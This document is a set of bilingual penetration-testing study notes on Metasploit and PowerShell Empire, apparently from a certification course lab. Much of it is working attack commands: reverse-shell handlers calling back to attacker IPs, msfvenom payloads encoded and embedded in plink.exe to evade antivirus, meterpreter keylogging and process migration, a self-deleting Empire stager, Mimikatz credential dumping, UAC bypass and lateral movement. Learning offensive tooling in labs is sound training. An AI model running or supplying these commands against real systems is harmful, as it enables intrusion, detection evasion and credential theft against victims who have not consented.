# Metasploit
补充：
post-exploitation：
pivoting tech
transport protocol

## basic

```
sudo systemctl start postgresql
sudo systemctl enable postgresql

sudo msfdb init

sudo apt update; sudo apt install metasploit-framework

use
back
previous
```

### 配合DB
```
service -h

db_nmap ip -A -Pn

hosts 
services -p 445 

workspace [name]
```

### 快速启动
```
msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
set LHOST 192.168.119.196;\
set LPORT 443;\
run"
```

## modules
### auxiliary
protocol enumeration, port scanning, fuzzing, sniffing, and more.

```
show auxiliary

search type:auxiliary name:smb
use scanner/smb/smb2
info

// auto 
services -p 445 --rhosts
```

### exploit
contain exploit code for vulnerable applications and services

```
search syncbreeze
info exploit/windows/http/syncbreeze_bof
use exploit/windows/http/syncbreeze_bof
set payload windows/shell_reverse_tcp
set lhost
set rhost
check

```

### payloads
常用场景
client-side attack， backdoor， stand-alone as easy method  to get a payload from one machine to another

* Non-staged 
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
A non-staged payload is sent in its entirety along with the exploit. 

shell_xxx  

* Staged
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
shell/xxx 
In contrast, a staged payload is usually sent in two parts. The
first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

* Meterpreter
a multi-function payload that can be dynamically extended at run-time. 
In practice, this means that the Meterpreter shell provides more features and functionality than a regular command shell
offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine. 
These tools are especially useful in the post-exploitation phase.

```
search meterpreter type:payload

getuid
sysinfo
ls
pwd
download
upload c:\\Windows\\system32\\calc.exe /tmp/calc.exe

shell
```

### multi handler
multi/handler, works for all single and multi-stage payloads.
specify the incoming payload type first

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
show options
set lhost
set lport
exploit

//run backgroud
exploit -j
jobs 
// 查看 job
jobs -i
kill 0 
```

advanced feaatures and transports

```
show advanced

//stageencoding,  encode second stage and bypass detection
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

//autoreatically enumerate logged-in users when meterpreter connect
set AutoRunScript windows/gather/enum_logged_on_users
```

### msfvenom
client-side attacks
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
```
msfvenom -l formats
search flash
```

* generate shell

```
use payload/windows/shell_reverse_tcp
set LPORT 5555
set LHOST 192.168.0.2
generate

generate -h

#windows
use payload/windows/exec
use payload/cmd/windows/generic
```
* executable payloads

```
-p payload
lhost lport, listen ip and port
-f format(exe,)
-o output file
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe

// encode 绕过 av 检测
-e , msf encoders
-i set the desired number of encoding interations
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

// 注入文件，绕过检测
-x ， specify file to inject into
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

//msfconsole  generate 
generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o test.exe
```

## build module

```
sudo mkdir -p /root/.msf4/modules/exploits/windows/http
sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb

sudo vim /root/.msf4/modules/exploits/windows/http/syncbreeze.rb

update header information
update default option and settings,
update check
update exploit, uri exploit
```

### post-exploition
post-exploitation phase
gather information, take steps to maintain our access, pivot to other machines

```
meterpreter> screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

```

migrating process
Using the migrate command, we can move the execution of our meterpreter to different processes
only able to migrate into a process executing at the same privilege and integrity level or lower than that of our current process.
```
ps
migrate pid

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show option
set lhost 192.168.119.196
//migrate meterpreter to another process after session create
set AutoRunScript post/windows/manage/migrate   
exploit
```

```
22.5.4.1 Exercise p719
1. Use post-exploitation modules and extensions along with pivoting techniques to enumerate
and compromise the domain controller from a meterpreter shell obtained from your
Windows 10 client.
```

### automation

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z

//save and execute
sudo msfconsole -r setup.rc

22.6.1.1 Exercise p721
1. Create a resource script using both a second stage encoder and autorun scripts and use it
with the meterpreter payload.
```



# Power Empire

basic
While Empire seems to share many features with the Metasploit Framework, they are quite
different in nature. Metasploit includes a vast collection of exploits designed to gain initial access.
Empire, on the other hand, is designed as a post-exploitation tool targeted primarily at Active
Directory environments. It tends to leverage built-in features of the target operating system and
its major applications.

listeners -- multi/handler
stager    -- same to exploit 
agent     -- sessions

## install
```bash
# https://github.com/EmpireProject/Empire.git
## install error
## https://zhuanlan.zhihu.com/p/499519304
## https://blog.csdn.net/wuxinweii/article/details/121152538
## db readonly error, change data/empire.db
cd ~
git clone https://github.com/EmpireProject/Empire.git
cd Empire/
./setup/install.sh
./empire

# or install 
## https://bc-security.gitbook.io/empire-wiki/quickstart/installation
```

## basic usage
### listener
same to handler

```bash
//listeners
uselistener http
info
set Host 10.11.0.4
execute
back
```

### stager
same to payload
生成可执行文件、命令等；
如，windows 生成bat文件，文件执行powershell命令，执行代码base64编码
```bash
//stager
usestager windows/launcher_bat
info
set Listener http
execute

kali@kali:/opt/Empire$ cat /tmp/launcher.bat
@echo off
start /b powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBp...
start /b "" cmd /c del "%~f0"&exit /b
```

### agent
same to msf session
> * 支持execute commands 以及 和系统交互
> * Once the agent is operational on the target, it will set up an AES-encrypted communication channel with listener using the data portion of the HTTP GET/POST requests
> * help查看帮助，常用upload，download，secreenshot，shell，psinject
> * mannually switch to newly agent after inject/migrate

```bash
//agent
agents
interact S2Y5XW1L
sysinfo   //screenshot,upload,download,shell,spawn
help

//migrate
ps 
psinject http 3568
agents
interact DWZ49BAP
```

23.1.3.1 Exercises
Now that we’ve walked through the basic features of PowerShell Empire, try these exercises on your own to solidify your knowledge.
1. Install and start PowerShell Empire on your Kali system.
2. Create a PowerShell Empire listener on your Kali machine and execute a stager on your Windows 10 client.
3. Experiment with the PowerShell Empire agent and its basic functionality.

## moudule

### Situational Awareness

Ad enum
> get_user, privesc, credentials dump/mimikatz

```bash
# MinLanguageVersion, minimum version of powershell, win7/2008 R2 默认为powershell 2
usemodule situational_awareness/network/powerview/get_user

```

### Credential and privesc

```bash
usemodule powershell/privesc/powerup/allchecks

usemodule privesc/bypassuac_fodhelper

(Empire: K678VC13) > usemodule credentials/mimikatz/logonpasswords
execute

mimikatz(powershell) # sekurlsa::logonpasswords

# 可通过creds store查看
(Empire: K678VC13) > creds
(Empire: K678VC13) > creds add corp.com jeff_admin Qwerty09!
```

### lateral movement
**Lateral Movement**
> Once we gain valid user credentials, we can use them to log into additional systems until we reach our objective. This is known as lateral movement.

```bash
usemodule lateral_movement/technique # space or double tap to list the tech
inveigh_relay invoke_psremoting invoke_wmi
invoke_dcom invoke_smbexec invoke_wmi_debugger
invoke_executemsbuild invoke_sqloscmd jenkins_script_console
invoke_psexec invoke_sshcommand new_gpo_immediate_task

(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec
```
![](index_files/2408fcf4-92b2-41b5-9caa-c5f1cfb6a7ee.png)

### creds error

```
# use 2018 to windows 10,8.1
## error info: ERROR kuhl_m_sekurlsa_acquireLSA, key import
## git issue: https://github.com/EmpireProject/Empire/issues/1379 , https://github.com/EmpireProject/Empire/issues/1293
## https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1

```

## Switch MSF & Empire
已获取shell的情况下，通过已有shell(msf meterpreter/empire agents) 获取新的agents/sessions, 灵活切换；
msf 和 empire 各有优势，配合使用。

